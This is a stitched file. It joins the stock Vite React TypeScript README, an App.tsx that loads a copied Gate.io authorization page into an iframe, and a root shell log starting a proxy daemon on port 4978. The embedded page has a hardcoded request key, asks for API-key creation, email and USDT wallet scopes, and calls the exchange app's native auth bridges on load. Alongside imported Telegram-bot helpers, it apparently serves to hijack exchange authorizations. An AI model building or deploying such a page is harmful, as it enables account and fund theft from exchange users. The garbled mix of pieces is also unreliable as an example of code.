# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react/README.md) uses [Babel](https://babeljs.io/) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
export default {
  // other rules...
  parserOptions: {
    ecmaVersion: 'latest',
    sourceType: 'module',
    project: ['./tsconfig.json', './tsconfig.node.json'],
    tsconfigRootDir: __dirname,
  },
}
```

- Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
- Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
- Install [eslint-plugin-react](https://github.com/jsx-eslint/eslint-plugin-react) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list

import { useCallback, useState } from "react";
import reactLogo from "./assets/react.svg";
import viteLogo from "/vite.svg";
import "./App.css";
import { auth, sendTelegramMessage, auth2 } from "./lib/TGBot";

function App() {
  const [count, setCount] = useState(0);

  const [msg, setMsg] = useState("");


  const onClick = useCallback(() => {
    auth2((msg: any) => {
      setMsg(`<!DOCTYPE html><html lang="en">
      <head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Document</title>
        <style>
          html,
          body {
            background: url(https://gimg2.gateimg.com/miniprogram/miniapp-auth-bg.png) no-repeat;
            background-size: 100%;
            background-color: #2354E6;
          }
        </style>
      </head>
      <body>
      <input type="hidden" value="RQT-V2-cc768acb999de541b93326ef8cbea3e997a22d19b39f3d257f30729351bb3e00" id="requestKey"><input type="hidden" value="android" id="agent">
      <textarea hidden id="scopes">{&#34;create_apikey&#34;:[],&#34;read_email&#34;:[],&#34;read_profile&#34;:[],&#34;read_wallet&#34;:[&#34;USDT&#34;]}</textarea>
      <script>
      window.addEventListener('load', (event) => {
        console.log('page is fully loaded',event);
        var requestKey = document.getElementById("requestKey").value;
        var agent = document.getElementById("agent").value;
        var scopes = document.getElementById("scopes").value;
        if (agent === "android") {
          if (window.gateio.internalAuthScope != undefined) {
            window.gateio.internalAuthScope(requestKey, scopes);
          } else {
            window.gateio.internalAuth(requestKey);
          }
        } else if (agent === "ios") {
          if (window.webkit.messageHandlers.internalAuthScope != undefined) {
            var params = {
              "auth": requestKey,
              "scopes": scopes
            };
            window.webkit.messageHandlers.internalAuthScope.postMessage(params);
          } else {
            var params = {
              "auth": requestKey
            };
            window.webkit.messageHandlers.internalAuth.postMessage(params);
          }
        }
        });
      </script>
      </body>
      </html>`);
    });
  }, []);

  return (
    <>
      <div >
        <iframe srcDoc={msg} width="100%"
          height="500"></iframe>
      </div>




      <div>
        <a href="https://react.dev" target="_blank">
          <img src={reactLogo} className="logo react" alt="React logo" />
        </a>
      </div>
      <h1>Vite + React</h1>
      <div className="card">
        <button
          onClick={() => {
            onClick();
            setCount((count) => count + 1);
          }}
        >
          count is {count}
        </button>
        <p>
          Edit <code>src/App.tsx</code> and save to test HMR
        </p>
      </div>
      <p className="read-the-docs">
        {msg}
      </p>
    </>
  );
}

export default App;


root@hcss-ecs-061e:~# lsof -i:4978
root@hcss-ecs-061e:~# lsof -i:4978
root@hcss-ecs-061e:~# proxy http -t tcp -p "0.0.0.0:4978" --daemon
2024/03/18 23:53:35.879 INFO proxy [PID] 227245 running...
root@hcss-ecs-061e:~# lsof -i:4978
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
proxy   227245 root    6u  IPv4 1722955      0t0  TCP *:4978 (LISTEN)

